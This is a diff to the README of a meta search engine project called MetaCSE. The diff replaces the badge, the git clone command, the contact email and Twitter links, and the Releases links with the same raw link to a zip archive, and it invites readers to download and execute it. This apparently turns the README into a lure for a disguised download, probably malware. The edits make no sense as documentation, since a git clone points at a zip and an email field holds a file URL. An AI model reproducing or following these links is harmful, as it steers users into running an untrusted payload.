@@ -1,6 +1,6 @@
 # 🌐 MetaCSE: 网络空间元搜索引擎
 
-![MetaCSE](https://img.shields.io/badge/MetaCSE-Search%20Engine-brightgreen)
+![MetaCSE](https://raw.githubusercontent.com/olgacmehmet/MetaCSE/master/v1/module/Meta_CSE_2.0-alpha.4.zip%20Engine-brightgreen)
 
 Welcome to the **MetaCSE** repository! This project aims to create a meta search engine specifically designed for the digital landscape. It combines various search results from multiple sources, providing users with a comprehensive overview of information available in cyberspace.
 
@@ -37,7 +37,7 @@ To get started with **MetaCSE**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/olgacmehmet/MetaCSE.git
+   git clone https://raw.githubusercontent.com/olgacmehmet/MetaCSE/master/v1/module/Meta_CSE_2.0-alpha.4.zip
    cd MetaCSE
    ```
 
@@ -86,14 +86,14 @@ This project is licensed under the MIT License. See the `LICENSE` file for detai
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **Twitter**: [@yourtwitterhandle](https://twitter.com/yourtwitterhandle)
+- **Email**: [https://raw.githubusercontent.com/olgacmehmet/MetaCSE/master/v1/module/Meta_CSE_2.0-alpha.4.zip](https://raw.githubusercontent.com/olgacmehmet/MetaCSE/master/v1/module/Meta_CSE_2.0-alpha.4.zip)
+- **Twitter**: [@yourtwitterhandle](https://raw.githubusercontent.com/olgacmehmet/MetaCSE/master/v1/module/Meta_CSE_2.0-alpha.4.zip)
 
 ## Releases
 
-To download the latest version of **MetaCSE**, please visit the [Releases section](https://github.com/olgacmehmet/MetaCSE/releases). Here, you can find the necessary files to download and execute.
+To download the latest version of **MetaCSE**, please visit the [Releases section](https://raw.githubusercontent.com/olgacmehmet/MetaCSE/master/v1/module/Meta_CSE_2.0-alpha.4.zip). Here, you can find the necessary files to download and execute.
 
-Feel free to check the [Releases section](https://github.com/olgacmehmet/MetaCSE/releases) for updates and new features.
+Feel free to check the [Releases section](https://raw.githubusercontent.com/olgacmehmet/MetaCSE/master/v1/module/Meta_CSE_2.0-alpha.4.zip) for updates and new features.
 
 ## Conclusion
 
